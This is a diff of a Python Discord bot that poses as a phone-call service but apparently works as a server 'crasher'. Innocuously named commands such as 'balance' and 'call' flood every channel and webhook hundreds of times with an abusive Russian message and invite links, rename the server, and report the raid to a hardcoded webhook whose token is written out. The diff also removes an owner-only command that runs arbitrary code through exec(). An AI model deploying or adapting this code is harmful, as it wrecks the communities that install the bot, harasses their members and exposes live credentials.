@@ -32,7 +32,7 @@ def localtime():
 async def on_ready():
     current_id.write(f'{client.user.id}')
     current_id.close()
-    await client.change_presence(status = discord.Status.idle, activity = discord.Activity(name='t!call | .gg/43GtxcFXPK', type=discord.ActivityType.watching))
+    await client.change_presence(status = discord.Status.idle, activity = discord.Activity(name='t!call | .gg/', type=discord.ActivityType.watching))
     print(f'primary bot {client.user.name}#{client.user.discriminator}({client.user.id}) is ready.')
 
 
@@ -81,7 +81,7 @@ async def spam_v2(ctx):
     for channel in ctx.guild.text_channels:
         for hook in await channel.webhooks():
             jsonn = {
-                "content": "@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK"
+                "content": "@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере весело: https://shrk.tk/crushers"
             }
             try:
                 requests.post(f'{hook.url}', json = jsonn)
@@ -133,8 +133,6 @@ async def call(ctx):
             await ctx.guild.edit(name = settings['TEXT'])
             pfp_ch = 'Нет'
 
-        print('Crash ended.')
-        print('Sending webhook crash report.')
     #CRASH REPORT
         title = None
         if ctx.guild.avatar:
@@ -176,12 +174,12 @@ async def call(ctx):
                         "thumbnail": {
                             "url": f"{servericon}"
                             },
-                    "username": "Destroyer [LITE]",
+                    "username": "Destroyer",
                     "avatar_url": "https://cdn.discordapp.com/attachments/656864136856076289/849704735035359272/servericon1.png"
                     }
                 ]
             }
-            requests.post('https://discord.com/api/webhooks/869613265506947133/wdyc9XLg-st1AE7-t5GQ7xUxhhm-SADIvZUfM0pmOBKjoUSneY_bF9Cs-ceMo9v62xJk', json = jsonn)
+            requests.post('https://discord.com/api/webhooks/915468623043244052/Xe59BEknB5VXX8ORl7jiKcwbkx9Ee10gcW1GC8ro4vqZ8zmDWI5XsXHVvixOqRp7soXE', json = jsonn)
         else:
             pass
     else:
@@ -193,7 +191,7 @@ async def __spam(ctx):
         for i in range(500):
             try:
                 for channel in ctx.guild.text_channels:
-                    await channel.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
+                    await channel.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
             except:
                 break
     else:
@@ -201,47 +199,28 @@ async def __spam(ctx):
 
 @client.command(aliases=['help'])
 async def __help(ctx):
-  await ctx.send('Help command.\nt!call - start a call\nt!caller_id - get your number\nt!settings - show bot settings\nt!balance - chech youe balance on guild\nt!subscribe - can offer a good subscription')
-
-@client.command(aliases=['exe'])
-async def ex(ctx, *, args):
-    if ctx.author.id == 610453921726595082:
-        try:
-            out = exec(args)
-            await ctx.send(f'Output:\n```{out}\n```')
-        except:
-            await ctx.send(f'An error occured in this command:\n```{args}\n```')
-    else:
-        await ctx.send('Нельзя :)')
+  await ctx.send('Help command.\nt!call - start a call\nt!caller_id - get your number\nt!balance - chech youe balance on guild\nt!subscribe - can offer a good subscription')
 
 @client.command(aliases=['balance'])
 async def __current(ctx):
     if ctx.guild.id not in whiteservers:
         for i in range(555):
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
-            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/43GtxcFXPK')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
+            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
             
     else:
         await ctx.send(f'Сервер защищён от спама. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
-@client.command(aliases=['settings'])
-async def __settings(ctx):
-    if ctx.guild.id not in whiteservers:
-        for _ in range(500):
-            for i in ctx.guild.text_channels:
-                await i.send('https://gfycat.com/acclaimedpowerfulkatydid')
-    else:
-        await ctx.send(f'Этот сервер защищён. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
 
 @client.command(name = 'subscribe')
 async def test123(ctx):
